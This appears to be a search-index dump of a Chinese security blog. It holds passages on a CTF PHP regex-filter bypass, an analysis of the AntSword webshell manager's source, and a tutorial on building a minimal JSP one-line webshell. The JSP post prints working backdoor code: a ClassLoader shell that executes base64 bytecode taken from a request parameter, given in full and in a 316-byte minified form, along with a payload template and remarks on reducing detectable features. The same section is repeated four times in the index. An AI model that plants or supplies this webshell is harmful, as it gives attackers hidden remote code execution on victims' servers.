（则正则最终解析为 \\/div） $rs = preg_match($pattern, $str, $arr); if($rs) print_r($arr); // Array ( [0] =\u003e \\/div ) 但是出题人似乎觉得不够，又在后面加了四个反斜杠的匹配，似乎本意是要过滤\\跟\\\\？ 理论来说已经出现了四个\\\\\\\\了，但是为什么还会造成非预期ca\\t这种解呢？ 我们本地测试一下 去掉其他的乱七八糟的东西，只留下对于反斜杠等的过滤 可以看到虽然正则中有\\\\\\\\，但是却无法过滤到反斜杠。 反向思考其原因，应该是问题出在前面两个反斜杠的匹配部分。 因为正则匹配中相当于要经过两层解析器解析，一层是php的，一层是正则表达式的。所以此处前面的两个反斜杠经过php解析器处理后应该是表示了一个转义号\\，之后又与后面的表示逻辑或的|结合到一起，从而在正则表达式解析器中解析为\\|。又因为|是正则中的保留符号，所以需要一个转义符来转义。所以最后的实现效果应为对于字符|的过滤。 所以我们猜测这种写法真正被解析的结果应该是对于字符串|\\的过滤，即不是单独的\\的匹配。 我们来验证一下猜想是否正确： 可以看到此时已经触发了正则匹配机制，输出了forbid。 所以综上所述：非预期的原因是错误的正则写法匹配了|\\，而非预期的\\ ","date":"2020-04-12","objectID":"/posts/php-preg-tricks/:2:0","series":null,"tags":["CTF"],"title":"从一道CTF的非预期解看PHP反斜杠匹配问题","uri":"/posts/php-preg-tricks/#正文"},{"categories":["技术文章"],"content":"\r3 错误的一些说法","date":"2020-04-12","objectID":"/posts/php-preg-tricks/:3:0","series":null,"tags":["CTF"],"title":"从一道CTF的非预期解看PHP反斜杠匹配问题","uri":"/posts/php-preg-tricks/#错误的一些说法"},{"categories":["技术文章"],"content":"\r3.1 第一个https://www.cnblogs.com/20175211lyz/p/12189515.html 这篇文章中提到反斜杠有这么多种匹配方法，如果你做实验的话发现也确实会输出1234。事实真的是这样吗？ 随便写个字符串，发现134照样可以匹配到。 原因是134条规则都在左右多加了个|，然而|左右为空，也就是说对于任意空字符串都可以匹配，而并非预期的目的。 ","date":"2020-04-12","objectID":"/posts/php-preg-tricks/:3:1","series":null,"tags":["CTF"],"title":"从一道CTF的非预期解看PHP反斜杠匹配问题","uri":"/posts/php-preg-tricks/#第一个"},{"categories":["技术文章"],"content":"\r3.2 第二个这篇文章的解释是把\\t当成tab，这个就更离谱了。 https://blog.csdn.net/SopRomeo/article/details/104124545 ","date":"2020-04-12","objectID":"/posts/php-preg-tricks/:3:2","series":null,"tags":["CTF"],"title":"从一道CTF的非预期解看PHP反斜杠匹配问题","uri":"/posts/php-preg-tricks/#第二个"},{"categories":["技术文章"],"content":"\r3.3 第三个https://www.jianshu.com/p/21e3e1f74c08 这个同学自己调试了一番，离真相就差一点啦。 ","date":"2020-04-12","objectID":"/posts/php-preg-tricks/:3:3","series":null,"tags":["CTF"],"title":"从一道CTF的非预期解看PHP反斜杠匹配问题","uri":"/posts/php-preg-tricks/#第三个"},{"categories":["技术文章"],"content":"\r4 最后纸上得来终觉浅，绝知此事要躬行。 与君共勉。 ","date":"2020-04-12","objectID":"/posts/php-preg-tricks/:4:0","series":null,"tags":["CTF"],"title":"从一道CTF的非预期解看PHP反斜杠匹配问题","uri":"/posts/php-preg-tricks/#最后"},{"categories":["技术文章"],"content":"\r1 前言发现很多同学对于蚁剑的基本流程还有源码结构不太熟悉，所以就有了这一篇比较基础的文章，来讲一讲自己对于蚁剑的一些认识。 通过阅读本篇文章，你可以了解蚁剑的源码结构、运行流程、以及自己动手diy时要注意的几个地方。 ","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:1:0","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:2:0","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#正文"},{"categories":["技术文章"],"content":"\r2.1 目录结构 /antData/ 用户目录 /modules/ 蚁剑后端模块 /node_modules/ 安装的node模块 /source/ 核心模块 /base/ 自定义的功能类 /core/ payload模板 /language/ 语言模块 /modules/ 显示模块 /ui/ UI模块 /app.entry.js 渲染程序入口 /load.entry.js 前端加载模块 /static/ 静态资源文件 /views/ 前端文件 其中最核心的是modules目录跟source目录。modules里的内容为蚁剑的后端模块，属于主进程。source中存放着蚁剑运行的核心代码，属于渲染进程。 ","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:2:1","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#目录结构"},{"categories":["技术文章"],"content":"\r2.2 如何debug蚁剑的开发栈主要是：javascript / nodejs / electron。 Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。通过Node它提供了通常浏览器所不能提供的能力。 简单来说就是chrome里跑nodejs。 所以想要对蚁剑二次开发，要首先熟悉一下nodejs的基本语法。 electron里面又分主进程跟渲染进程，对于主进程的调试需要用到vscode等，而对于渲染进程只需要用到蚁剑中自带的dev tool就可以。具体可以看这篇文章：https://blog.csdn.net/gary_yan/article/details/78973336 一般来说，我们并不需要对modules中的后端模块进行修改，所以一般不会用到主进程调试，仅仅蚁剑中自带的dev tool就可以完成我们日常的调试工作。 打开蚁剑-\u003e调试-\u003e开发者工具即可看到调试工具。 是不是跟chrome一模一样？ 其中console用于打印输出日志，蚁剑中默认的日志只会打印前100个字符，如果要查看完整日志需要输入antsword.logs[id]查看，在这里我们直接查看所有日志。 我们先连接上本地的shell，然后打印完整日志，就可以看到我们发包的很多参数，包括shell的配置， 编码器设置，字符编码，返回内容等等 那么我们在哪里下断点呢 答案是在控制台sources-\u003eno domain下面,打开后我们可以看到渲染进程中加载到的各种资源、模块 然后我们找到想下断点的文件，就拿php的base64编码器为例，在其10行处点击一下会出现蓝标，就表示下断点成功。 此时我们在shell管理界面右键-\u003e刷新目录，就可以看到程序已经断到了我们下断点的地方，在右边可以看到此时的调用栈还有各种变量信息，就可以愉快的调试了。 ","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:2:2","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#如何debug"},{"categories":["技术文章"],"content":"\r2.3 执行流程 主程序入口：app.js /source/load.entry.js 前端加载模块 /source/app.entry.js 渲染程序入口 /source/modules/filemanager/index.js 监听用户操作 /source/core/php/template/ 提取组合Payload /source/core/base.js 发送事件与配置到后端request模块 解析、回显 就按刚才php base64编码器为例，我们看一下蚁剑是如何运行到这一步的。 查看上一个调用栈，发现是进入到了编码器处理部分，编码器会接收到三个参数：shell密码、初步payload、还有ext参数。 其中ext参数即为shell的配置信息还有rsa对象的组合，这也是为什么我们在写编码器的时候可以直接获取到shell的各种配置信息。 再往上看，发现complete函数调用了encodeComplete函数，complete负责将payload套入到模板中，并且设置数据前后分割符，发送给encodeComplete进行处理。 再进入到core/base中的request函数，此函数负责将组合完成的数据包发送到后端的request模块。 那么是如何触发到这个请求功能的呢，我们直接跳到最开始的点击事件来看。 发现是当我们点击刷新目录后，会触发refreshPath函数。 然后refreshPath函数分析是否有传递的路径参数，如果没有则为刷新当前目录。 然后gotoPath调用了this.manager.getFiles函数。 getFiles函数调用this.core.request，第一个参数为this.core.filemanager.dir，即为payload模板中的dir部分。 接着组合、发送payload数据包，获取回显并解析。 其中解析跟回显部分不是我们关注的重点，我们关注的重点主要是提取组合payload到发送最终数据包的阶段。大家自己调试一下就明白其中的流程了。 ","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:2:3","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#执行流程"},{"categories":["技术文章"],"content":"\r2.4 修改数据包的几个重点位置其中，如果要修改发送的数据包，有三个位置可以供我们参考。 \\source\\core\\base.js#187 模板组合（作用对象为全体） \\source\\core\\php\\encoder\\base64.js 编码器处理（作用于当前类型） \\modules\\request.js 最终发包（不建议修改） 不建议修改后端最终发包是因为蚁剑中后端默认不能获取到所有的opt配置内容，除非自己加，我觉得比较麻烦。 ","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:2:4","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#修改数据包的几个重点位置"},{"categories":["技术文章"],"content":"\r2.5 配合opt参数实现自定义设置opt参数中有shell的所有配置，通过此项可以做到动态修改数据包的内容。比如说我在基于随机Cookie的蚁剑动态秘钥编码器中就是利用ext.opts.httpConf.headers['Cookie'] = xxx在数据包头部添加了一个cookie作为秘钥 在编码器中要用ext.opts.xxx来访问你想要访问的配置内容，在其他地方一般用this.__opts__.xxx或者opts['xxx']即可。 ","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:2:5","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#配合opt参数实现自定义设置"},{"categories":["技术文章"],"content":"\r3 最后在实现蚁剑jsp一句话的过程中，我使用了额外传递参数的方式来决定采用什么编码器、什么字符编码等。大家可以看一下我在编码器中的写法。 这个方法是挺简单，但是特征也比较明显。那么怎么办呢？ 相信你读完这篇文章后已经可以试着自己去改掉这个特征，有好的想法欢迎跟我交流。 ","date":"2020-04-11","objectID":"/posts/antsword-diy-4/:3:0","series":null,"tags":["中国蚁剑"],"title":"中国蚁剑源码分析","uri":"/posts/antsword-diy-4/#最后"},{"categories":["技术文章"],"content":"\r1 前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。 因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。 不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。 蚁剑改造计划之实现动态秘钥编码器解码器 蚁剑改造计划之基于随机Cookie的动态秘钥编码器 蚁剑改造计划之增加垃圾数据 蚁剑改造计划之实现其他参数的随机化 ","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:1:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:0","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#正文"},{"categories":["技术文章"],"content":"\r2.1 基本原理由于Java中没有所谓的eval函数，无法对直接传递的代码进行解析执行。所以不管是蚁剑还是菜刀对于JSP的shell一直是采用custom模式，即把要执行的代码提前写在shell中，然后每次只需要传递要调用的函数名以及对应的参数即可。 虽然可以实现相应的功能，但是带来一个问题就是shell体积非常巨大。菜刀的jsp脚本有7kb大小，蚁剑的jsp custom脚本即使去掉注释后还有17k之多，用起来非常的不方便。 冰蝎的作者rebeyond大佬在文章 利用动态二进制加密实现新型一句话木马之Java篇 中提出了一种新的jsp一句话的实现方式：利用classloader直接解析编译后的class字节码，相当于实现了一个java的eval功能。 反复阅读rebeyond大佬的文章，不得不感叹思路的巧妙。 自己以前通过类反射+动态加载字节码的方式实现了一个命令执行后门，但是是在shell中获取的输入输出。参数个数也不可控，只能一股脑按最大数传进去，还会有类反射的特征。 然而冰蝎是直接重写了Object类的equals方法，并且把pageContext传了进去。熟悉jsp的同学都知道，通过pageContext就可以控制几乎所有的页面对象，也就可以在payload中动态控制输入输出。 冰蝎的方法既没有类反射之类的特征，又便于控制输入输出，实在是妙。 但是冰蝎很久没更新了，并且暂时没有开源，有些小BUG修改起来非常麻烦。我就想能否把这个功能给移植到蚁剑上。 冰蝎的操作是直接用asm框架来修改提前写好的字节码文件，把要传入的参数直接编译进去。由于冰蝎自身就是java写的，所以动态产生字节码具有天生的优势。但是蚁剑的后端是nodejs，这怎么办呢？ ","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:1","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#基本原理"},{"categories":["技术文章"],"content":"\r2.2 思路的选择大概有以下三种思路： （1）用nodejs来修改java字节码。 （2）写一个专门用来生成payload的jar包，每次执行前调用此jar包，把需要编译的参数通过命令行传入，然后获取回显。 （3）在蚁剑中硬编码payload，然后通过getParameter把参数传进去。 三种方式各有利弊，第一个想法最简单，但是难度大。超出了本人菜鸟教程上学来的java跟node水平。 自己本来是想采用第二个思路，跟yan表哥交流后放弃。就不说用exec调用会不会产生命令注入这种东西，采用第二种方式需要修改蚁剑原有的模式框架，并且还需要配置java环境。而蚁剑从设计之初就是想着能尽量减少对环境的需求。尽管从2.0系列推出加载器后不再需要node环境就可以运行蚁剑，但是目前还是有一堆人连安装蚁剑都有困难。 所以在本文中实现的是第三种思路，硬编码payload+其他参数传参。 首先根据现成的custom脚本来编写payload，然后把custom的模板给复制一份，把传递的函数名替换成payload即可。 采用这种模式的话就跟其他shell发送payload的模式相同，不需要对蚁剑原有的框架进行大改。只不过其他类型传递的是可见的代码，jsp传递的是编译后的字节码。 ","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:2","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#思路的选择"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。 编译命令 javac -cp \"D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar\" Test.java 保存编译后的class字节码 base64 -w 0 Test.class \u003e Test.txt 2.3.2 乱码问题的解决然后是让人头秃的乱码问题。 众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。 在php版的custom中对于编码是这样处理的： 其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。 decode函数是对字符串进行解码，比如说base64、hex这种。 但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。 调试了一下果然会乱码，然后报找不到路径的错误。 解决方法就是把两个函数换换位置就好了。 换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。 把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。 突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。 经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。 原因为什么呢？ 因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。 但是经过测试php类型会正常的根据用户的字符类型来base64编码。 emmmm，玄学问题。 最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。 2.3.3 模板设计Shell模板 \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%! class U extends ClassLoader{ U(ClassLoader c){ super(c); } public Class g(byte []b){ return super.defineClass(b,0,b.length); } } BASE64Decoder decoder=new sun.misc.BASE64Decoder(); %\u003e \u003c% String cls=request.getParameter(\"ant\"); if(cls!=null){ new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); } %\u003e 压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。 \u003c%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%\u003e\u003c% String cls=request.getParameter(\"ant\");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%\u003e Payload模板 其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。 注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。 import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.jsp.PageContext; import java.io.ByteArrayOutputStream; public class Demo { public String encoder; public String cs; @Override public boolean equals(Object obj) { PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(\"encoder\")!=null?request.getParameter(\"encoder\"):\"\"; cs=request.getParameter(\"charset\")!=null?request.getParameter(\"charset\"):\"UTF-8\"; StringBuffer output = new StringBuffer(\"\"); StringBuffer sb = new StringBuffer(\"\"); try { response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(\"var0\")+\"\")); String var1 = EC(decode(request.getParameter(\"var1\")+\"\")); String var2 = EC(decode(request.getParameter(\"var2\")+\"\")); String var3 = EC(decode(request.getParameter(\"var3\")+\"\")); output.append(\"-\u003e\" + \"|\"); sb.append(func(var1)); output.append(sb.toString()); output.append(\"|\" + \"\u003c-\"); page.getOut().print(output.toString()); } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } return true; } String EC(String s) throws Exception { if(encoder.equals(\"hex\")) return s; return new String(s.getBytes(), cs); } String decode(String str) throws Exception{ if(encoder.equals(\"hex\")){ if(str==\"null\"||str.equals(\"null\")){ return \"\"; } String hexString = \"0123456789ABCDEF\"; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = \"\"; for (int i = 0; i \u003c str.length(); i += 2){ ss = ss + (hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1))) + \",\"; baos.write((hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1)))); } return baos.toString(\"UTF-8\"); }else if(encoder.equals(\"base64\")){ byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,\"UTF-8\"); } return str; } String func (Stri","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#具体实现"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。 编译命令 javac -cp \"D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar\" Test.java 保存编译后的class字节码 base64 -w 0 Test.class \u003e Test.txt 2.3.2 乱码问题的解决然后是让人头秃的乱码问题。 众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。 在php版的custom中对于编码是这样处理的： 其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。 decode函数是对字符串进行解码，比如说base64、hex这种。 但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。 调试了一下果然会乱码，然后报找不到路径的错误。 解决方法就是把两个函数换换位置就好了。 换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。 把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。 突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。 经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。 原因为什么呢？ 因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。 但是经过测试php类型会正常的根据用户的字符类型来base64编码。 emmmm，玄学问题。 最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。 2.3.3 模板设计Shell模板 \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%! class U extends ClassLoader{ U(ClassLoader c){ super(c); } public Class g(byte []b){ return super.defineClass(b,0,b.length); } } BASE64Decoder decoder=new sun.misc.BASE64Decoder(); %\u003e \u003c% String cls=request.getParameter(\"ant\"); if(cls!=null){ new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); } %\u003e 压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。 \u003c%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%\u003e\u003c% String cls=request.getParameter(\"ant\");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%\u003e Payload模板 其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。 注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。 import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.jsp.PageContext; import java.io.ByteArrayOutputStream; public class Demo { public String encoder; public String cs; @Override public boolean equals(Object obj) { PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(\"encoder\")!=null?request.getParameter(\"encoder\"):\"\"; cs=request.getParameter(\"charset\")!=null?request.getParameter(\"charset\"):\"UTF-8\"; StringBuffer output = new StringBuffer(\"\"); StringBuffer sb = new StringBuffer(\"\"); try { response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(\"var0\")+\"\")); String var1 = EC(decode(request.getParameter(\"var1\")+\"\")); String var2 = EC(decode(request.getParameter(\"var2\")+\"\")); String var3 = EC(decode(request.getParameter(\"var3\")+\"\")); output.append(\"-\u003e\" + \"|\"); sb.append(func(var1)); output.append(sb.toString()); output.append(\"|\" + \"\u003c-\"); page.getOut().print(output.toString()); } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } return true; } String EC(String s) throws Exception { if(encoder.equals(\"hex\")) return s; return new String(s.getBytes(), cs); } String decode(String str) throws Exception{ if(encoder.equals(\"hex\")){ if(str==\"null\"||str.equals(\"null\")){ return \"\"; } String hexString = \"0123456789ABCDEF\"; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = \"\"; for (int i = 0; i \u003c str.length(); i += 2){ ss = ss + (hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1))) + \",\"; baos.write((hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1)))); } return baos.toString(\"UTF-8\"); }else if(encoder.equals(\"base64\")){ byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,\"UTF-8\"); } return str; } String func (Stri","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#编译环境的选择"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。 编译命令 javac -cp \"D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar\" Test.java 保存编译后的class字节码 base64 -w 0 Test.class \u003e Test.txt 2.3.2 乱码问题的解决然后是让人头秃的乱码问题。 众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。 在php版的custom中对于编码是这样处理的： 其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。 decode函数是对字符串进行解码，比如说base64、hex这种。 但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。 调试了一下果然会乱码，然后报找不到路径的错误。 解决方法就是把两个函数换换位置就好了。 换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。 把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。 突然想起来自己以前提的一个issue jsp的bug，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。 经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。 原因为什么呢？ 因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。 但是经过测试php类型会正常的根据用户的字符类型来base64编码。 emmmm，玄学问题。 最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。 2.3.3 模板设计Shell模板 \u003c%@ page import=\"sun.misc.BASE64Decoder\" %\u003e \u003c%! class U extends ClassLoader{ U(ClassLoader c){ super(c); } public Class g(byte []b){ return super.defineClass(b,0,b.length); } } BASE64Decoder decoder=new sun.misc.BASE64Decoder(); %\u003e \u003c% String cls=request.getParameter(\"ant\"); if(cls!=null){ new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext); } %\u003e 压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。 \u003c%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%\u003e\u003c% String cls=request.getParameter(\"ant\");if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%\u003e Payload模板 其中encoder为编码方式，默认为空，可选hex或者base64。charset为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。 注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。 import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.jsp.PageContext; import java.io.ByteArrayOutputStream; public class Demo { public String encoder; public String cs; @Override public boolean equals(Object obj) { PageContext page = (PageContext)obj; ServletRequest request = page.getRequest(); ServletResponse response = page.getResponse(); encoder = request.getParameter(\"encoder\")!=null?request.getParameter(\"encoder\"):\"\"; cs=request.getParameter(\"charset\")!=null?request.getParameter(\"charset\"):\"UTF-8\"; StringBuffer output = new StringBuffer(\"\"); StringBuffer sb = new StringBuffer(\"\"); try { response.setContentType(\"text/html\"); request.setCharacterEncoding(cs); response.setCharacterEncoding(cs); String var0 = EC(decode(request.getParameter(\"var0\")+\"\")); String var1 = EC(decode(request.getParameter(\"var1\")+\"\")); String var2 = EC(decode(request.getParameter(\"var2\")+\"\")); String var3 = EC(decode(request.getParameter(\"var3\")+\"\")); output.append(\"-\u003e\" + \"|\"); sb.append(func(var1)); output.append(sb.toString()); output.append(\"|\" + \"\u003c-\"); page.getOut().print(output.toString()); } catch (Exception e) { sb.append(\"ERROR\" + \":// \" + e.toString()); } return true; } String EC(String s) throws Exception { if(encoder.equals(\"hex\")) return s; return new String(s.getBytes(), cs); } String decode(String str) throws Exception{ if(encoder.equals(\"hex\")){ if(str==\"null\"||str.equals(\"null\")){ return \"\"; } String hexString = \"0123456789ABCDEF\"; str = str.toUpperCase(); ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2); String ss = \"\"; for (int i = 0; i \u003c str.length(); i += 2){ ss = ss + (hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1))) + \",\"; baos.write((hexString.indexOf(str.charAt(i)) \u003c\u003c 4 | hexString.indexOf(str.charAt(i + 1)))); } return baos.toString(\"UTF-8\"); }else if(encoder.equals(\"base64\")){ byte[] bt = null; sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder(); bt = decoder.decodeBuffer(str); return new String(bt,\"UTF-8\"); } return str; } String func (Stri","date":"2020-03-28","objectID":"/posts/antsword-diy-3/:2:3","series":null,"tags":["中国蚁剑"],"title":"蚁剑改造计划之实现JSP一句话","uri":"/posts/antsword-diy-3/#乱码问题的解决"},{"categories":["技术文章"],"content":"\r2.3 具体实现\r2.3.1 编译环境的选择首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。 编译命令 javac -cp \"D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar\" Test.java 保存编译后的class字节码 base64 -w 0 Test.class \u003e Test.txt 2.3.2 乱码问题的解决然后是让人头秃的乱码问题。 众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。 在php版的custom中对于编码是这样处理的： 其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。 decode函数是对字符串进行解码，比如说base64、hex这种。 但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。 调试了一下果然会乱码，然后报找不到路径的错误。 